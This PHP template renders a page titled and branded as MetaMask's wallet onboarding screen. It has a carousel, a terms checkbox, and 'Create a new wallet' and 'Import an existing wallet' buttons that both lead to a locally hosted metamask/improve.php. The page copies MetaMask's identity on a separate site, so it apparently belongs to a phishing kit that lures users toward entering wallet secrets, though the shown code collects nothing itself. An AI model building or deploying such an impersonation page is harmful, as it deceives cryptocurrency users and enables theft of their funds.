<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'The Ultimate Crypto Wallet for DeFi, Web3 Apps, and NFTs | MetaMask';
    include_once './meta.php';
    ?>
    <body>
        <?php include_once './header.php'; ?>
        <?php
        $list = [
            ['img' => base_url('assets/img/mt/MetaMask_Fox.svg'), 'h4' => "Let's get started", 'div' => "Trusted by millions, MetaMask is a secure wallet making the world of web3 accessible to all."],
            ['img' => base_url('assets/img/mt/onboarding-welcome-say-hello.svg'), 'h4' => "Explore decentralized apps", 'div' => "Store, send and spend crypto currencies and assets."],
            ['img' => base_url('assets/img/mt/onboarding-welcome-decentralised-apps.svg'), 'h4' => "Say hello to your wallet", 'div' => "Use your MetaMask to login to decentralized apps - no signup needed."],
        ];
        ?>
        <div class="container">
            <div class="row justify-content-center mt40">
                <div class="col-sm-6 rounded-4 border p25 px60">
                    <div id="crsl_meta" class="carousel carousel-dark slide">
                        <div class="carousel-indicators">
                            <?php foreach ($list as $k => $l) : ?>
                                <button type="button" data-bs-target="#crsl_meta" data-bs-slide-to="<?= $k ?>" class="<?= $k == 0 ? 'active' : '' ?>" aria-current="<?= $k == 0 ?>" aria-label="Slide 1"></button>
                            <?php endforeach; ?>
                        </div>
                        <div class="carousel-inner text-center">
                            <?php foreach ($list as $k => $l) : ?>
                                <div class="carousel-item <?= $k == 0 ? 'active' : '' ?>" style="height: 400px;" data-bs-interval="<?= ($k + 1) * 10000 ?>">
                                    <h4 class="text-center fw-bold"><?= $l['h4'] ?></h4>
                                    <div class="my15 mx30 text-center"><?= $l['div'] ?></div>
                                    <img src="<?= $l['img'] ?>" class="" style="max-height: 240px" alt="...">
                                </div>
                            <?php endforeach; ?>
                        </div>
                        <button class="carousel-control-prev" type="button" data-bs-target="#crsl_meta" data-bs-slide="prev">
                            <span class="carousel-control-prev-icon" aria-hidden="true"></span>
                            <span class="visually-hidden">Previous</span>
                        </button>
                        <button class="carousel-control-next" type="button" data-bs-target="#crsl_meta" data-bs-slide="next">
                            <span class="carousel-control-next-icon" aria-hidden="true"></span>
                            <span class="visually-hidden">Next</span>
                        </button>
                    </div>
                    <div class="form-check my20">
                        <input class="form-check-input" type="checkbox" value="" id="flexCheckDefault">
                        <label class="form-check-label" for="flexCheckDefault">
                            I agree to MetaMask's 
                            <a href="https://metamask.io/terms-of-use" class="text-decoration-none text-primary" target="_blank">Terms of use</a>
                        </label>
                    </div>
                    <div class="text-center mx-auto w-75 d-grid gap-6">
                        <a href="<?= base_url('metamask/improve.php')?>" class="btn btn-primary bg-primary-2 rounded-pill py10 fs15 my15">Create a new wallet</a>
                        <a href="<?= base_url('metamask/improve.php')?>" class="btn btn-outline-primary rounded-pill py10 fs15 my15">Import an existing wallet</a>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './footer.php'; ?>
    </body>
</html>